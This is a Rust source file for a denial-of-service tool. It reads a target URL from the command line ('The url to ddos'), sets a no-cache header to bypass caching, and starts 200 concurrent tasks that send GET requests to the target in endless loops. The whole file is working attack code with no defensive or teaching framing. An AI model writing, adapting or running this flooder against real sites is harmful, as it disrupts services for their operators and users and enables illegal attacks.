#![feature(async_closure)]
use getopts::Options;
use reqwest::Client;
use std::env;
use std::sync::Arc;

async fn get_data(client: &Client, url: &String) {
    loop {
        let result = client.get(url).send();
        match result.await {
            Ok(_value) => {}
            Err(e) => {
                println!("Error, {}", e);
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();

    let mut opts = Options::new();
    opts.optopt("u", "url", "The url to ddos", "NAME");
    let matches = match opts.parse(&args[1..]) {
        Ok(m) => m,
        Err(f) => {
            panic!("{}", f.to_string())
        }
    };
    let url: Option<String> = matches.opt_str("u");
    if url.is_none() {
        panic!("{}", "No URL");
    }
    let url = url.unwrap();

    let builder = reqwest::Client::builder();
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(
        "Cache-Control",
        reqwest::header::HeaderValue::from_static("no-cache"),
    );

    let client = builder.default_headers(headers).build()?;
    let awa = Arc::new(client);

    print!("Starting attack to {}", url);
    for _i in 0..200 {
        let owo = Arc::clone(&awa);
        let url = url.clone();
        let _handle = tokio::spawn(async move {
            get_data(&owo, &url).await;
        });
    }

    loop {}
}
